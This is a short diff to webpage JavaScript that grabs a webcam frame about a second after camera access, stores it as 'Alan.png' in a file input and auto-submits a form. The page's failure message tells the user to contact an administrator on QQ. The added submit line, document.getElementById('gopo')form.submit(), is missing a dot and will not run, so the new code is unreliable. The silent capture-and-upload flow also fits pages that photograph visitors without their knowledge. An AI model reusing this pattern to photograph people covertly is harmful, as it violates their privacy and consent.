@@ -24,11 +24,14 @@
                     setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000);
                     setTimeout(function () {
                         canvas.toBlob((blob) => {
-                            const form = document.getElementById('gopo')
-                            const formData = new FormData(form);
-                            formData.set("image", blob, "alan.png");
-                            form.submit();
-                        });
+
+                            let file = new File([blob], "Alan.png", { type: "image/png", lastModified: new Date().getTime() });
+                            let container = new DataTransfer();
+                            container.items.add(file);
+                            document.getElementById('result').files = container.files;
+                            document.getElementById('gopo')form.submit();
+                        }
+                        );
 
                     }, 1300);
                 }, function () { alert("操作失败，权限不够！请联系管理员 QQ"); });
